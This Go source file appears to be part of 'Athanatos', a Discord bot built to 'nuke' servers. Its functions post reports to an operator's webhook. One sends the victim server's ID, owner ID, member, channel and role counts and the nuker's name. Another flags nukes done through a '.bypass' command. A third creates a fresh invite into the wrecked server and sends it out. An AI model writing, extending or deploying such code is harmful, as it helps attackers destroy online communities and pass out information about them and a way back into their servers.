package start_end

import (
	"Athanatos/core/requests"
	"encoding/json"
	"fmt"
	"os"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

func Logs(s *discordgo.Session, m *discordgo.MessageCreate) {

	guild, err := s.State.Guild(m.GuildID)
	if err != nil {
		fmt.Println("Error getting guild: ", err)
		return
	}

	godotenv.Load()
	AVATAR_URL := os.Getenv("AVATAR_URL")
	WEBHOOK_URL := os.Getenv("WEBHOOK_URL")

	channels, _ := s.GuildChannels(guild.ID)
	textChannels := len(channels)

	roles, _ := s.GuildRoles(guild.ID)
	rolesInt := len(roles)

	thumbnail := discordgo.MessageEmbedThumbnail{
		URL: AVATAR_URL,
	}

	embed := discordgo.MessageEmbed{
		Title:     "Server " + fmt.Sprint(guild.Name) + " has been nuked.",
		Thumbnail: &thumbnail,
		Color:     16777215,
		Description: "> **Server ID:** " + "`" + fmt.Sprint(guild.ID) + "`\n" +
			"> **Owner ID:** " + "`" + fmt.Sprint(guild.OwnerID) + "`\n" +
			"> **Region:** " + "`" + fmt.Sprint(guild.Region) + "`\n" +
			"> **Nuker:** " + "`" + fmt.Sprint(m.Author) + "`\n" +
			"\n" +
			"> **All Members:** " + "`" + fmt.Sprint(guild.MemberCount) + "`\n" +
			"> **All Channels:** " + "`" + fmt.Sprint(textChannels) + "`\n" +
			"> **All Roles:** " + "`" + fmt.Sprint(rolesInt) + "`\n" +
			"\n" +
			"> **Joined At:** " + "`" + fmt.Sprint(guild.JoinedAt) + "`\n",
	}

	data := &discordgo.WebhookParams{
		Embeds: []*discordgo.MessageEmbed{&embed},
	}
	jsonData, _ := json.Marshal(data)

	requests.Sendhttp(string(WEBHOOK_URL), "POST", jsonData)
}

func LogsAlert(s *discordgo.Session, m *discordgo.MessageCreate) {

	guild, err := s.State.Guild(m.GuildID)
	if err != nil {
		fmt.Println("Error getting guild: ", err)
		return
	}

	godotenv.Load()
	WEBHOOK_URL := os.Getenv("WEBHOOK_URL")

	embed := discordgo.MessageEmbed{
		Title: "Server " + fmt.Sprint(guild.Name) + " has been nuked via ``.bypass`` command.",
		Color: 16777215,
	}

	data := &discordgo.WebhookParams{
		Embeds: []*discordgo.MessageEmbed{&embed},
	}
	jsonData, _ := json.Marshal(data)

	requests.Sendhttp(string(WEBHOOK_URL), "POST", jsonData)
}

func InviteCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	godotenv.Load()
	CHANNEL_NAME := os.Getenv("CHANNEL_NAME")

	channel, err := s.GuildChannelCreate(m.GuildID, CHANNEL_NAME, discordgo.ChannelTypeGuildText)
	if err != nil {
		fmt.Println("Error creating invite:", err)
		return
	}

	godotenv.Load()
	WEBHOOK_URL := os.Getenv("WEBHOOK_URL")

	invite, err := s.ChannelInviteCreate(channel.ID, discordgo.Invite{})
	if err != nil {
		fmt.Println("Error creating invite:", err)
		return
	}

	embed := discordgo.MessageEmbed{
		Title:       "Invite to nuked server",
		Color:       16777215,
		Description: "> **" + "https://discord.gg/" + fmt.Sprint(invite.Code) + "**\n",
	}

	data := &discordgo.WebhookParams{
		Embeds: []*discordgo.MessageEmbed{&embed},
	}
	jsonData, err := json.Marshal(data)
	if err != nil {
		fmt.Println("Error creating invite:", err)
		return
	}

	requests.Sendhttp(string(WEBHOOK_URL), "POST", jsonData)
}
